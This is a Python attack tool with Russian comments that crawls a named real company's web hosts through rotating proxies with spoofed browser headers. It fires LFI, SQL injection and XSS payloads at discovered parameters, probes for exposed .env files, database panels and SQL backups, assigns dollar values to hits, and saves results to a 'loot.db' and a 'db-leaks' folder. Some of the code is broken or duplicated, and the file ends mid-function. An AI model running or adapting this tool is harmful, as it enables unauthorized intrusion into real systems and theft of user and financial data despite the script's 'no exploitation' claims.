#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Многопоточный паук-краулер для ABET Global через пул SOCKS/HTTP прокси с ротацией.
Разведка: GET-запросы, сбор URL/JS/форм/robots + LFI-проверка параметров (полуактивная).
Флаги: --lfi (LFI-тест), --kirpich (age-шифрование результатов, ключ проекта).
Без эксплуатации: только чтение и полуактивные GET-запросы через прокси."""
import re
import sys
import os
import time
import json
import urllib3
import requests
import subprocess
import concurrent.futures as cf

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FLAG_LFI = "--lfi" in sys.argv
FLAG_SQLI = "--sqli" in sys.argv
FLAG_XSS = "--xss" in sys.argv
FLAG_DBCHECK = "--db-check" in sys.argv
FLAG_KIRPICH = "--kirpich" in sys.argv
FLAG_DOWNLOAD = "--download" in sys.argv
FLAG_ALIVE = "--alive" in sys.argv
FLAG_COLLECT = "--collect" in sys.argv

LFI_NAMES = ("file", "path", "page", "template", "doc", "include", "lang", "dir", "folder", "style", "theme", "load", "read", "url", "filename", "filepath")
LFI_PAYLOADS = (
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../windows/win.ini",
    "....//....//....//etc/passwd",
)
LFI_INDICATORS = ("root:", "daemon:", "win.ini", "[fonts]", "[extensions]", "boot.ini", "nobody:", "syntax error", "failed to open stream")

SQLI_NAMES = ("id", "user", "uid", "page", "cat", "category", "product", "item", "news", "article", "post", "search", "q", "query", "lang", "file", "doc", "download", "ref", "order", "sort")
SQLI_PAYLOADS = (
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND SLEEP(5)",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
)
SQLI_INDICATORS = (
    "sql syntax", "mysql", "mariadb", "postgresql", "oracle", "sqlite", "microsoft odbc",
    "unclosed quotation", "unterminated string", "mysql_fetch", "you have an error",
    "warning: mysql", "pg_query", "syntax error", "db error", "database error",
    "sqlstate", "odbc driver", "server error in", "exception", "stack trace",
    "query failed", "invalid query", "psql", "mssql", "sql server",
)
SQLI_TIME_MS = 4500  # порог для time-based детекции

XSS_NAMES = ("q", "search", "query", "s", "term", "name", "user", "username", "email", "comment", "msg", "message", "text", "title", "lang", "page", "url", "link", "id", "ref")
XSS_PAYLOADS = (
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '"><iframe src="javascript:alert(1)">',
    'javascript:alert(1)',
    '"><svg onload=alert(document.domain)>',
)
XSS_REFLECT = ("<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<iframe src=\"javascript:alert(1)\">", "<svg onload=alert(document.domain)>")

def _parse_hosts():
    """Хосты — из аргументов без '--' (флаги отфильтровываем)."""
    hosts = [a for a in sys.argv[1:] if not a.startswith("--") and "," in a]
    if hosts:
        return hosts[0].split(",")
    # один хост без запятой тоже допустим
    single = [a for a in sys.argv[1:] if not a.startswith("--") and "." in a]
    if single:
        return [single[0]]
    return [
        "abetglobal.com", "www.abetglobal.com", "uat.abetglobal.com",
        "testadmin.abetglobal.com", "eedmin.abetglobal.com", "manage.abetglobal.com",
        "secure.abetglobal.com", "www.secure.abetglobal.com", "staging.abetglobal.com",
        "forum.abetglobal.com", "api.abetglobal.com", "cmsapi.abetglobal.com",
        "crypto.abetglobal.com", "testmt5.abetglobal.com", "applicationapi.abetglobal.com",
    ]

HOSTS = _parse_hosts()

PROXIES = [
    {"http": "socks5h://101.36.104.239:10808", "https": "socks5h://101.36.104.239:10808"},
    {"http": "socks5h://101.36.104.46:10808", "https": "socks5h://101.36.104.46:10808"},
]

def _fresh_proxies():
    """Свежие ВАЛИДНЫЕ прокси строго через API пула (не из файла!).
    API отдаёт только проверенные (rtt<900). Дополнительно валидируем каждым CONNECT."""
    import socket
    try:
        r = requests.get("http://127.0.0.1:8912/socks5.txt?limit=40", timeout=8)
        cands = [l.strip() for l in r.text.splitlines() if ":" in l]
    except Exception:
        cands = []
    out = []
    for c in cands[:12]:
        # валидация прокси ПЕРЕД добавлением пауку (CONNECT к 8.8.8.8:53)
        try:
            h, p = c.rsplit(":", 1)
            import socks as _socks
            s = _socks.socksocket()
            s.set_proxy(_socks.SOCKS5, h, int(p))
            s.settimeout(6)
            s.connect(("8.8.8.8", 53))
            s.close()
            out.append({"http": "socks5h://" + c, "https": "socks5h://" + c})
        except Exception:
            continue
    return out

def _refresh_proxies():
    global PROXIES
    fresh = _fresh_proxies()
    if fresh:
        base = [
            {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
            {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"},
        ]
        PROXIES = base + fresh
        print(f"[spider] пул прокси обновлён: {len(PROXIES)} (ротатор + {len(fresh)} свежих)", flush=True)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
MAX_WORKERS = 16
DEPTH = 2
MAX_URLS_PER_HOST = 120
TIMEOUT = 12
_pi = 0
_lock = __import__("threading").Lock()
PROXY_STATE = {}  # id(proxy) -> {"fail": n}

def check_proxies():
    """Health-check всех прокси при старте: параллельный пинг через api.ipify.org.
    Возвращает список живых прокси и печатает статус-таблицу."""
    def ping(p):
        try:
            r = requests.get("https://api.ipify.org", proxies=p, verify=False, timeout=8)
            return (p, r.status_code == 200, r.text.strip())
        except Exception:
            return (p, False, "-")
    alive = []
    with cf.ThreadPoolExecutor(max_workers=len(PROXIES)) as ex:
        results = list(ex.map(ping, PROXIES))
    print("[spider] ── HEALTH-CHECK прокси ──", flush=True)
    for p, ok, ip in results:
        tag = p.get("http", "")
        status = f"OK (exit={ip})" if ok else "DEAD"
        print(f"  {tag:45} {status}", flush=True)
        if ok:
            alive.append(p)
    if not alive:
        print("[spider] ВСЕ прокси мертвы — работаю с последним известным", flush=True)
        alive = PROXIES[:1]
    return alive

def next_proxy():
    global _pi
    with _lock:
        for _ in range(len(PROXIES)):
            p = PROXIES[_pi % len(PROXIES)]
            _pi += 1
            st = PROXY_STATE.get(id(p), {"fail": 0})
            if st["fail"] < 3:  # живой или мало ошибок
                return p
        return PROXIES[0]

def proxy_fail(p):
    with _lock:
        st = PROXY_STATE.setdefault(id(p), {"fail": 0})
        st["fail"] += 1

def proxy_ok(p):
    with _lock:
        st = PROXY_STATE.setdefault(id(p), {"fail": 0})
        st["fail"] = 0

RE_LINKS = re.compile(r'(?:href|src|action|data-url|data-href)=["\']([^"\']+)["\']', re.I)
RE_JS = re.compile(r'\.js(?:\?[^"\'\s)]*)?', re.I)

def norm(base, u):
    if not u or u.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
        return None
    if u.startswith('//'):
        u = 'https:' + u
    u = requests.compat.urljoin(base, u)
    if u.startswith('http') and not u.startswith('https'):
        u = 'https' + u[4:]
    return u

def is_same_host(u, host):
    try:
        from urllib.parse import urlparse
        return urlparse(u).netloc == host or urlparse(u).netloc.endswith('.' + host)
    except Exception:
        return False

def fetch(url, host):
    """GET с ротацией прокси и failover (до 3 прокси на запрос). Возвращает (status, content_type, body) или (0, None, None)."""
    for _try in range(3):
        proxy = next_proxy()
        try:
            r = requests.get(url, proxies=proxy, headers={"User-Agent": UA,
                "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Referer": "https://www.google.com/",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site",
                "Cache-Control": "no-cache"}, verify=False, timeout=TIMEOUT,
                allow_redirects=True)
            proxy_ok(proxy)
            if r.status_code and r.status_code < 400:
                return (r.status_code, (r.headers.get('Content-Type') or '').lower(), r.text)
            # 4xx/5xx — пробуем следующий прокси (сайт может блочить этот IP)
            proxy_fail(proxy)
            continue
        except Exception:
            proxy_fail(proxy)
            continue
    return (0, None, None)

def crawl_host(host):
    base = f"https://{host}/"
    seen, to_visit = set(), [base]
    found = {"urls": set(), "js": set(), "forms": [], "robots": [], "sitemap": [], "errors": []}
    depth_map = {base: 0}
    for _ in range(MAX_URLS_PER_HOST):
        if not to_visit:
            break
        url = to_visit.pop(0)
        if url in seen:
            continue
        seen.add(url)
        d = depth_map.get(url, 0)
        st, ct, body = fetch(url, host)
        found["urls"].add(f"{st}\t{url}")
        if st == 0:
            found["errors"].append(url)
            continue
        if not body:
            continue
        # robots.txt / sitemap
        if url.rstrip('/').endswith('/robots.txt'):
            for line in body.splitlines():
                if line.strip().startswith(('Disallow', 'Allow')):
                    found["robots"].append(line.strip())
                    p = line.split(':', 1)[1].strip() if ':' in line else None
                    if p and p != '/':
                        pu = norm(base, p)
                        if pu and is_same_host(pu, host) and pu not in seen:
                            to_visit.append(pu); depth_map[pu] = d + 1
        if 'sitemap' in url:
            for m in re.findall(r'<loc>\s*([^<]+?)\s*</loc>', body, re.I):
                found["sitemap"].append(m)
        # формы
        for fm in re.findall(r'<form[^>]*>(.*?)</form>', body, re.I | re.S):
            action = re.search(r'action=["\']([^"\']*)', fm, re.I)
            method = re.search(r'method=["\']([^"\']*)', fm, re.I)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', fm, re.I) + \
                     re.findall(r'<select[^>]*name=["\']([^"\']+)["\']', fm, re.I)
            found["forms"].append({"page": url, "action": action.group(1) if action else "",
                                   "method": (method.group(1) if method else "get").upper(),
                                   "inputs": list(dict.fromkeys(inputs))})
        # ссылки
        for m in RE_LINKS.findall(body):
            u = norm(url, m)
            if not u or not is_same_host(u, host):
                continue
            if RE_JS.search(u) and u.lower().endswith('.js'):
                found["js"].add(u)
                continue
            if u not in seen and u not in to_visit and d < DEPTH:
                to_visit.append(u); depth_map[u] = d + 1
    return host, found

def lfi_check(host, url):
    """Полуактивная LFI-проверка: для параметров-кандидатов подставляет traversal payload.
    Возвращает список находок [(param, payload, code, indicator)]."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    for name, val in params:
        if name.lower() not in LFI_NAMES:
            continue
        for payload in LFI_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            st, ct, body = fetch(target, host)
            if st == 200 and body:
                low = body.lower()
                for ind in LFI_INDICATORS:
                    if ind in low:
                        hits.append((name, payload, st, ind))
                        break
    return hits


def sqli_check(host, url):
    """Полуактивная SQLi-проверка: параметры-кандидаты + payload, ищем индикаторы ошибок БД и time-based.
    Только GET-запросы через прокси, без эксплуатации/дампов."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return hits
    for name, val in params:
        if name.lower() not in SQLI_NAMES:
            continue
        for payload in SQLI_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            t0 = time.time()
            st, ct, body = fetch(target, host)
            dt = (time.time() - t0) * 1000
            # time-based (SLEEP/WAITFOR)
            if dt > SQLI_TIME_MS and ("sleep" in payload.lower() or "waitfor" in payload.lower()):
                hits.append((name, payload, st, f"TIME-BASED {int(dt)}ms"))
                continue
            if st == 200 and body:
                low = body.lower()
                for ind in SQLI_INDICATORS:
                    if ind in low:
                        hits.append((name, payload, st, ind))
                        break
    return hits


def xss_check(host, url):
    """Полуактивная XSS-проверка: параметры-кандидаты + payload, проверка ОТРАЖЕНИЯ в ответе.
    Только GET-запросы через прокси, без эксплуатации."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return hits
    for name, val in params:
        if name.lower() not in XSS_NAMES:
            continue
        for payload in XSS_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            st, ct, body = fetch(target, host)
            if st == 200 and body:
                for ind in XSS_REFLECT:
                    if ind in body:
                        # отражение без экранирования = рефлектед XSS
                        hits.append((name, payload, st, f"REFLECTED: {ind[:40]}"))
                        break
    return hits
    """Полуактивная LFI-проверка: для параметров-кандидатов подставляет traversal payload.
    Возвращает список находок [(param, payload, code, indicator)]."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    for name, val in params:
        if name.lower() not in LFI_NAMES:
            continue
        for payload in LFI_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            st, ct, body = fetch(target, host)
            if st == 200 and body:
                low = body.lower()
                for ind in LFI_INDICATORS:
                    if ind in low:
                        hits.append((name, payload, st, ind))
                        break
    return hits

def db_check(host, scheme="https"):
    """Проверка на CRITICAL/HIGH ошибки: открытые панели БД, .env, бэкапы БД, stack trace.
    Только GET через прокси. Возвращает список находок (path, code, category, price)."""
    PANEL_PATHS = ("/phpmyadmin", "/phpmyadmin/", "/pma", "/adminer.php", "/adminer", "/dbadmin", "/myadmin", "/db", "/db/")
    ENV_PATHS = ("/.env", "/.env.production", "/.env.local", "/.env.backup", "/wp-config.php.bak", "/wp-config.php~", "/config.php.bak")
    BACKUP_PATHS = ("/backup.sql", "/db.sql", "/dump.sql", "/database.sql", "/db_backup.sql", "/backup.zip", "/backup/db.sql")
    PANEL_HINTS = ("phpmyadmin", "adminer", "pma_", "server: mysql", "db administration")
    ENV_HINTS = ("db_", "database_url", "database_password", "db_password", "app_key", "secret_key", "api_key", "client_secret", "smtp_pass", "password=")
    TRACE_HINTS = ("fatal error", "stack trace", "on line ", "warning:", "uncaught", "exception", "undefined index", "deprecated:")
    hits = []
    for path in PANEL_PATHS + ENV_PATHS + BACKUP_PATHS:
        st, ct, body = fetch(f"{scheme}://{host}{path}", host)
        if st not in (200, 301, 302):
            continue
        if not body:
            continue
        low = body.lower()
        # SPA-fallback или редирект — не находка
        if len(low) < 60 or "<div id=\"root\"" in low or "<html" in low[:100] and "doctype" in low[:30]:
            if "phpmyadmin" not in low and "adminer" not in low:
                continue
        found = None
        if any(h in low for h in PANEL_HINTS):
            found = ("PANEL", "$$$$")
        elif path.startswith("/.") and any(h in low for h in ENV_HINTS) and "=" in low:
            found = ("ENV", "$$$$")
        elif any(h in low for h in TRACE_HINTS):
            found = ("TRACE", "$$$")
        if found:
            hits.append((path, st, found[0], found[1]))
            print(f"[DB-HIT] {host}{path} -> {st} {found[0]} {found[1]}", flush=True)
    return hits

def main():
    target_name = HOSTS[0].replace(".com", "").replace(".pl", "").replace(".net", "").replace(".io", "").replace(".", "_")
    out_urls = f"/root/office/output/{target_name}_spider_urls.txt"
    out_js = f"/root/office/output/{target_name}_spider_js.txt"
    out_forms = f"/root/office/output/{target_name}_spider_forms.txt"
    lfi_out = f"/root/office/output/{target_name}_lfi.txt"
    _refresh_proxies()
    global PROXIES
    PROXIES = check_proxies()  # health-check при старте: в ротации только живые
    all_urls, all_js, all_forms = set(), set(), []
    robots_all, sitemap_all, errs = {}, {}, {}
    with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = {ex.submit(crawl_host, h): h for h in HOSTS}
        for fu in cf.as_completed(futs):
            h = futs[fu]
            try:
                host, found = fu.result()
                all_urls.update(found["urls"])
                all_js.update(found["js"])
                all_forms.extend(found["forms"])
                robots_all[host] = found["robots"]
                sitemap_all[host] = found["sitemap"]
                errs[host] = found["errors"]
                print(f"[DONE] {host}: urls={len(found['urls'])} js={len(found['js'])} forms={len(found['forms'])} err={len(found['errors'])}", flush=True)
            except Exception as e:
                print(f"[FAIL] {h}: {e}", flush=True)
    with open(out_urls, "w") as f:
        f.write("\n".join(sorted(all_urls)) + "\n")
    with open(out_js, "w") as f:
        f.write("\n".join(sorted(all_js)) + "\n")
    with open(out_forms, "w") as f:
        for fm in all_forms:
            f.write(f"{fm['method']} {fm['page']} -> action={fm['action']} inputs={fm['inputs']}\n")
    # LFI-проход по всем собранным URL с параметрами
    lfi_hits = []
    cands = []
    # ⚠️ Инъекции проводятся ТОЛЬКО по точкам входа: URL с параметрами (?) или формами.
    # Если у хоста нет URL с параметрами — инъекции не запускаются (нет поверхности).
    param_urls = [u.split("\t", 1)[1] for u in all_urls if "?" in u]
    # Отсекаем cache-busting (?v=, ?ver=, ?_=, ?version=) — это НЕ точки входа
    from urllib.parse import urlparse, parse_qsl
    _real = []
    for u in param_urls:
        try:
            q = dict(parse_qsl(urlparse(u).query))
        except Exception:
            q = {}
        if q and not all(k.lower() in ("v", "ver", "version", "_", "t", "ts", "timestamp") for k in q):
            _real.append(u)
    param_urls = list(dict.fromkeys(_real))
    if FLAG_LFI and param_urls:
        print(f"\n=== LFI-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
        cands = param_urls[:80]
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(lfi_check, "spider", u): u for u in cands}
            for fu in cf.as_completed(futs):
                u = futs[fu]
                try:
                    for h in fu.result():
                        lfi_hits.append((u, *h))
                        print(f"[LFI-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
                except Exception:
                    pass
    elif FLAG_LFI:
        print("\n=== LFI: пропущено — URL с параметрами не найдены ===", flush=True)
    with open(lfi_out, "w") as f:
        f.write(f"# LFI-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(cands) if FLAG_LFI else 0}\n")
        for hit in lfi_hits:
            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
    # SQLi-проход: только по URL с параметрами (точки входа)
    sqli_hits = []
    sqli_cands = []
    if FLAG_SQLI and param_urls:
        print(f"\n=== SQLi-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
        sqli_cands = param_urls[:80]
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(sqli_check, "spider", u): u for u in sqli_cands}
            for fu in cf.as_completed(futs):
                u = futs[fu]
                try:
                    for h in fu.result():
                        sqli_hits.append((u, *h))
                        print(f"[SQLI-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
                except Exception:
                    pass
    elif FLAG_SQLI:
        print("\n=== SQLi: пропущено — URL с параметрами не найдены ===", flush=True)
    sqli_out = f"/root/office/output/{target_name}_sqli.txt"
    with open(sqli_out, "w") as f:
        f.write(f"# SQLi-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(sqli_cands) if FLAG_SQLI else 0}\n")
        for hit in sqli_hits:
            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
    # XSS-проход: только по URL с параметрами (точки входа)
    xss_hits = []
    xss_cands = []
    if FLAG_XSS and param_urls:
        print(f"\n=== XSS-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
        xss_cands = param_urls[:80]
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(xss_check, "spider", u): u for u in xss_cands}
            for fu in cf.as_completed(futs):
                u = futs[fu]
                try:
                    for h in fu.result():
                        xss_hits.append((u, *h))
                        print(f"[XSS-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
                except Exception:
                    pass
    elif FLAG_XSS:
        print("\n=== XSS: пропущено — URL с параметрами не найдены ===", flush=True)
    xss_out = f"/root/office/output/{target_name}_xss.txt"
    with open(xss_out, "w") as f:
         f.write(f"# XSS-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(xss_cands) if FLAG_XSS else 0}\n")
         for hit in xss_hits:
             f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
    # DB-CHECK: панели БД / .env / бэкапы / stack trace (CRITICAL/HIGH)
    db_hits = []
    if FLAG_DBCHECK:
        print(f"\n=== DB-CHECK (панели БД / .env / бэкапы / trace, хостов={len(HOSTS)}) ===", flush=True)
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(db_check, h): h for h in HOSTS}
            for fu in cf.as_completed(futs):
                h = futs[fu]
                try:
                    db_hits.extend([(h, *x) for x in fu.result()])
                except Exception:
                    pass
        db_out = f"/root/office/output/{target_name}_dbcheck.txt"
        with open(db_out, "w") as f:
            f.write(f"# DB-CHECK {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}\n")
            for hit in db_hits:
                f.write(f"{hit[0]}{hit[1]} | {hit[2]} | {hit[3]} | {hit[4]}\n")
        print(f"[DB-CHECK] найдено ценного: {len(db_hits)}")
    # Кирпич: шифрование результатов age-ключом проекта
    if FLAG_KIRPICH:
        for f_ in (out_urls, out_js, out_forms, lfi_out, sqli_out, xss_out):
            if os.path.exists(f_):
                try:
                    subprocess.run(["kirpich-encrypt.sh", f_], check=True, capture_output=True)
                    print(f"[KIRPICH] зашифровано: {f_}.age", flush=True)
                except Exception as e:
                    print(f"[KIRPICH] не удалось ({f_}): {e}", flush=True)
    print("\n=== ИТОГО ===")
    print(f"URL: {len(all_urls)} | JS: {len(all_js)} | FORM: {len(all_forms)} | LFI-HITS: {len(lfi_hits)} | SQLI-HITS: {len(sqli_hits)} | XSS-HITS: {len(xss_hits)}")
    print("\n--- ROBOTS ---")
    for h, r in robots_all.items():
        if r:
            print(h, "->", "; ".join(r))
    print("\n--- SITEMAP (loc) ---")
    for h, s in sitemap_all.items():
        if s:
            print(h, "->", "; ".join(s[:30]))
    print("\n--- ERRORS (недоступно) ---")
    for h, e in errs.items():
        if e:
            print(h, "->", len(e))


def _target_name():
    return HOSTS[0].replace(".com", "").replace(".pl", "").replace(".net", "").replace(".io", "").replace(".", "_")

# ════════════════════════════════════════════════════════
# ПРАВИЛА СКАЧИВАНИЯ ОТКРЫТЫХ ДАННЫХ (БЕЗ МУСОРА)
# Качаем ТОЛЬКО то, что выглядит как данные БД/API:
#   - Content-Type: json / csv / sql / txt-дамп / xlsx
#   - размер > 2 КБ (мелкие = SPA-фолбэки/пустые)
#   - НЕ качаем: html-фолбэки SPA (ровно 715 б у IIS), image, css, js-min
# ════════════════════════════════════════════════════════

# Content-Type, которые считаем данными
DATA_CONTENT_TYPES = ("json", "csv", "sql", "xlsx", "xls", "xml", "txt", "plain", "octet-stream", "zip", "gz", "yaml", "yml")
# Расширения файлов данных
DATA_EXTS = (".json", ".csv", ".sql", ".xlsx", ".xls", ".xml", ".txt", ".zip", ".gz", ".yaml", ".yml", ".db", ".sqlite", ".bak", ".dump", ".dat")
# Расширения, которые НИКОГДА не качаем (мусор)
SKIP_EXTS = (".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".map", ".min.js")
# Признаки данных в теле (JSON-массивы/объекты, строки БД)
DATA_HINTS = ('"rows"', '"data"', '"records"', '"result"', '"items"', '"clients"', '"users"', '"transactions"',
              '"withdrawal"', '"deposit"', '"wallet"', '"balance"', '"_id"', '"id":', '"email"', '"password"',
              '"amount"', '"total"', '"created_at"', '"updated_at"', 'INSERT INTO', 'CREATE TABLE', 'DROP TABLE')
MIN_DATA_SIZE = 2048  # байт — меньше этого качать нечего
# Точные размеры SPA-фолбэков (IIS возвращает одинаковый index.html) — пропускаем
SPA_FALLBACK_SIZE = 715  # известный размер фолбэка testadmin/eedmin


def _is_data_candidate(url, content_type, size, body_head):
    """Правило: качать ли этот ответ как данные."""
    from urllib.parse import urlparse
    p = urlparse(url)
    path = p.path.lower()
    # 1) явный мусор по расширению
    if path.endswith(SKIP_EXTS):
        return False
    # 2) SPA-фолбэк (известный размер)
    if size and abs(size - SPA_FALLBACK_SIZE) < 3:
        return False
    # 3) слишком мелко
    if size and size < MIN_DATA_SIZE:
        return False
    # 4) расширение данных — качаем
    if path.endswith(DATA_EXTS):
        return True
    # 5) Content-Type данных
    if content_type and any(dt in content_type for dt in DATA_CONTENT_TYPES) and "html" not in content_type:
        return True
    # 6) JSON-подобное тело (объект/массив) с признаками данных
    if body_head:
        bh = body_head[:2000].lstrip().lower()
        if bh.startswith(("{", "[")) and any(h in bh for h in ("\"id\"", "\"data\"", "\"rows\"", "\"result\"", "\"users\"", "\"email\"", "\"amount\"")):
            return True
    return False





def run_collect():
    """ПРАВИЛА ВЛАДЕЛЬЦА: всё что открыто и ценно — качаем в БД; ошибки = SQL-разведка.
    Сканирует собранные URL, ищет ошибки (sql syntax и т.п.) и ценные страницы, пишет в loot.db."""
    import sqlite3
    db = "/root/office/output/loot.db"
    c = sqlite3.connect(db)
    c.execute("""CREATE TABLE IF NOT EXISTS open_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT, value TEXT, detail TEXT, source TEXT)""")

    ERROR_SIGNALS = ("sql syntax", "sql error", "mysql_", "you have an error",
                     "fatal error", "stack trace", "uncaught", "warning:",
                     "internal server error", "syntax error", "odbc", "mssql")
    SQL_SIGNALS = ("sql syntax", "sql error", "mysql", "you have an error", "odbc", "mssql", "sqlstate")

    added = 0
    sql_candidates = []

    # собираем URL из файлов паука
    url_files = [f for f in os.listdir("/root/office/output") if f.endswith("_spider_urls.txt")]
    urls = []
    for uf in url_files:
        p = f"/root/office/output/{uf}"
        for line in open(p, encoding='utf-8', errors='replace'):
            if line.startswith("200\t"):
                urls.append(line.split("\t",1)[1].strip())

    print(f"[collect] проверяю {len(urls)} открытых URL на ошибки/ценность...", flush=True)
    for u in urls:
        st, ct, body = fetch(u)
        if not body:
            continue
        low = body.lower()
        for sig in ERROR_SIGNALS:
            if sig in low:
                # строка с ошибкой
                try:
                    m = re.search(r'.{0,60}' + re.escape(sig) + r'.{0,80}', body, re.I)
                    detail = m.group(0).replace('\n',' ')[:180] if m else sig
                except Exception:
                    detail = sig
                c.execute("INSERT OR IGNORE INTO open_data (type, value, detail, source) VALUES (?,?,?,?)",
                          ("error", u, f"{sig} | {detail}", "spider-collect"))
                added += 1
                if any(s in low for s in SQL_SIGNALS):
                    sql_candidates.append(u)
                    print(f"[collect] 🔴 SQL-СИГНАЛ: {u} [{sig}]", flush=True)
                else:
                    print(f"[collect] ⚠️ ошибка: {u} [{sig}]", flush=True)
                break

    c.commit()
    # SQL-кандидаты сохраняем отдельно
    if sql_candidates:
        with open("/root/office/output/sql_recon_candidates.txt", "w") as f:
            f.write("\n".join(sql_candidates) + "\n")
        print(f"\n[collect] SQL-РАЗВЕДКА: {len(sql_candidates)} кандидатов -> output/sql_recon_candidates.txt", flush=True)
    total = c.execute("SELECT COUNT(*) FROM open_data WHERE source='spider-collect'").fetchone()[0]
    print(f"[collect] ИТОГО добавлено в loot.db (open_data): {total}", flush=True)
    c.close()


def run_alive():
    """Проверка доступности хостов через прокси-ротатор. Вывод: жив/мёртв/ошибка."""
    target_name = _target_name()
    out = f"/root/office/output/{target_name}_alive.txt"
    results = []
    def _one(u):
        for _ in range(4):
            try:
                r = requests.get(u, proxies=next_proxy(), headers={"User-Agent": UA,
                    "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"},
                    verify=False, timeout=15, allow_redirects=True, stream=True)
                st = r.status_code
                r.close()
                # 1xx-4xx = сайт существует (ответ сервера); 0 = нет соединения
                if st:
                    return (u, st, 0)
            except Exception:
                continue
        return (u, 0, 0)
    print(f"[alive] проверяю {len(HOSTS)} хостов через прокси-ротатор...", flush=True)
    with cf.ThreadPoolExecutor(max_workers=12) as ex:
        for u, code, size in ex.map(_one, [f"https://{h}/" for h in HOSTS]):
            status = "ЖИВ" if code and code < 500 else ("МЁРТВ" if code == 0 else f"ERR{code}")
            results.append({"url": u, "code": code, "size": size, "status": status})
            print(f"{status:6} {code} {size:>8} {u}", flush=True)
    with open(out, "w") as f:
        for r in results:
            f.write(f"{r['status']}\t{r['code']}\t{r['url']}\n")
    alive = [r for r in results if r["code"] and r["code"] < 400]
    dead = [r for r in results if not r["code"]]
    errs = [r for r in results if r["code"] and r["code"] >= 400]
    print(f"\n[alive] ИТОГО: {len(results)} | ЖИВЫХ: {len(alive)} | МЁРТВЫХ: {len(dead)} | ОШИБКИ: {len(errs)}", flush=True)
    print(f"[alive] результат: {out}", flush=True)


def run_download():
    import shutil
    target_name = _target_name()
    base_dir = f"/root/office/db-leaks/{target_name}"
    os.makedirs(base_dir, exist_ok=True)
    seen = set()
    downloaded = 0
    # 1) все собранные URL (если есть файл)
    url_file = f"/root/office/output/{target_name}_spider_urls.txt"
    candidates = []
    if os.path.exists(url_file):
        for line in open(url_file):
            parts = line.rstrip("\n").split("\t", 1)
